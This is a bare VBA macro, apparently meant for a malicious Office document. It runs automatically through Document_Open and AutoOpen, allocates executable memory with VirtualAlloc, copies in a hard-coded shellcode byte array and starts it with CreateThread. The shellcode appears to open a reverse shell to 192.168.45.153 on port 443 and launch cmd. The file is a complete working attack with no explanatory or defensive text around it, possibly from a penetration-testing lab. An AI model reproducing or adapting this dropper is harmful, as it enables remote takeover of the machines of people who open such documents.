```
Private Declare PtrSafe Function CreateThread Lib "KERNEL32" (ByVal SecurityAttributes As Long, ByVal StackSize As Long, ByVal StartFunction As LongPtr, ThreadParameter As LongPtr, ByVal CreateFlags As Long, ByRef ThreadId As Long) As LongPtr
Private Declare PtrSafe Function VirtualAlloc Lib "KERNEL32" (ByVal lpAddress As LongPtr, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
Private Declare PtrSafe Function RtlMoveMemory Lib "KERNEL32" (ByVal lDestination As LongPtr, ByRef sSource As Any, ByVal lLength As Long) As LongPtr

Function mymacro()
    Dim buf As Variant
    Dim addr As LongPtr
    Dim counter As Long
    Dim data As Long
    Dim res As Long
    buf = Array(252, 232, 130, 0, 0, 0, 96, 137, 229, 49, 192, 100, 139, 80, 48, 139, 82, 12, 139, 82, 20, 139, 114, 40, 15, 183, 74, 38, 49, 255, 172, 60, 97, 124, 2, 44, 32, 193, 207, 13, 1, 199, 226, 242, 82, 87, 139, 82, 16, 139, 74, 60, 139, 76, 17, 120, 227, 72, 1, 209, 81, 139, 89, 32, 1, 211, 139, 73, 24, 227, 58, 73, 139, 52, 139, 1, 214, 49, 255, 172, 193, _
207, 13, 1, 199, 56, 224, 117, 246, 3, 125, 248, 59, 125, 36, 117, 228, 88, 139, 88, 36, 1, 211, 102, 139, 12, 75, 139, 88, 28, 1, 211, 139, 4, 139, 1, 208, 137, 68, 36, 36, 91, 91, 97, 89, 90, 81, 255, 224, 95, 95, 90, 139, 18, 235, 141, 93, 104, 51, 50, 0, 0, 104, 119, 115, 50, 95, 84, 104, 76, 119, 38, 7, 255, 213, 184, 144, 1, 0, 0, 41, _
196, 84, 80, 104, 41, 128, 107, 0, 255, 213, 80, 80, 80, 80, 64, 80, 64, 80, 104, 234, 15, 223, 224, 255, 213, 151, 106, 5, 104, 192, 168, 45, 153, 104, 2, 0, 1, 187, 137, 230, 106, 16, 86, 87, 104, 153, 165, 116, 97, 255, 213, 133, 192, 116, 12, 255, 78, 8, 117, 236, 104, 240, 181, 162, 86, 255, 213, 104, 99, 109, 100, 0, 137, 227, 87, 87, 87, 49, 246, 106, _
18, 89, 86, 226, 253, 102, 199, 68, 36, 60, 1, 1, 141, 68, 36, 16, 198, 0, 68, 84, 80, 86, 86, 86, 70, 86, 78, 86, 86, 83, 86, 104, 121, 204, 63, 134, 255, 213, 137, 224, 78, 86, 70, 255, 48, 104, 8, 135, 29, 96, 255, 213, 187, 240, 181, 162, 86, 104, 166, 149, 189, 157, 255, 213, 60, 6, 124, 10, 128, 251, 224, 117, 5, 187, 71, 19, 114, 111, 106, 0, _
83, 255, 213)

    addr = VirtualAlloc(0, UBound(buf), &H3000, &H40)
    For counter = LBound(buf) To UBound(buf)
        data = buf(counter)
        res = RtlMoveMemory(addr + counter, data, 1)
    Next counter
    
    res = CreateThread(0, 0, addr, 0, 0, 0)
End Function
Sub Document_Open()
    mymacro
End Sub

Sub AutoOpen()
    mymacro
End Sub
```
